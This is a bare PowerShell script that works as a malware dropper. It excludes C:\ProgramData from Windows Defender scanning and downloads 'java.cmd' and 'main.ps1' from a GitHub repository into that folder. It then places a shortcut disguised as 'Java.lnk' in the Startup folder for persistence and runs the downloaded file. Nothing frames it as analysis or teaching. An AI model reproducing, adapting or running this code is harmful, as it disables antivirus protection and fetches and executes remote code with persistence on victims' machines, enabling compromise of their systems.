Set-MpPreference -ExclusionPath C:\ProgramData
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$webClient = New-Object System.Net.WebClient
$url1 = 'https://github.com/qwertyuiopindia/log/raw/main/java.cmd?raw=true'
$file1 = "C:\ProgramData\java.cmd"
$url2 = 'https://github.com/qwertyuiopindia/log/raw/main/main.ps1?raw=true'
$file2 = "C:\ProgramData\main.ps1"
$webClient.DownloadFile($url1, $file1)
$webClient.DownloadFile($url2, $file2)
$objShell = New-Object -ComObject ("WScript.Shell")
$objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\Java.lnk")
$objShortCut.TargetPath = "C:\ProgramData\java.cmd"
$objShortCut.Save()
Start-Process $file1
exit

